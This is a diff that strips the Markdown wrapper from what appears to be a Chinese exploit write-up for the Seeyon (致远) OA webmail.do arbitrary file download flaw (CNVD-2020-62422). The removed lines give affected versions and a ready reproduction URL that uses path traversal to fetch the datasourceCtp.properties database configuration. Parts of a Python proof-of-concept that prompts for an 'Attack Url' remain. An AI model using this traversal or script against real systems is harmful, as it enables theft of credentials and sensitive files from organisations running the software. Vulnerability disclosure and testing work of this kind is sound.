@@ -1,32 +1,3 @@
-# 致远OA webmail.do任意文件下载 CNVD-2020-62422
-
-## 漏洞描述
-
-致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息
-
-## 漏洞影响
-
-> [!NOTE]
->
-> 致远OA A6-V5
->
-> 致远OA A8-V5
->
-> 致远OA G6
-
-## 漏洞复现
-
-访问 url  http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties
-
-存在漏洞的OA 系统将会下载 **datasourceCtp.properties** 配置文件
-
-![](image/zhiyuan-11.png)
-
-更改参数 filePath 可下载其他文件
-
-##  漏洞利用POC
-
-```python
 import requests
 import sys
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -60,10 +31,3 @@ if __name__ == '__main__':
     title()
     target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
     POC_1(target_url)
-```
-
-![](image/zhiyuan-12.png)
-
-## Goby & POC
-
-![](image/zhiyuan-13.png)
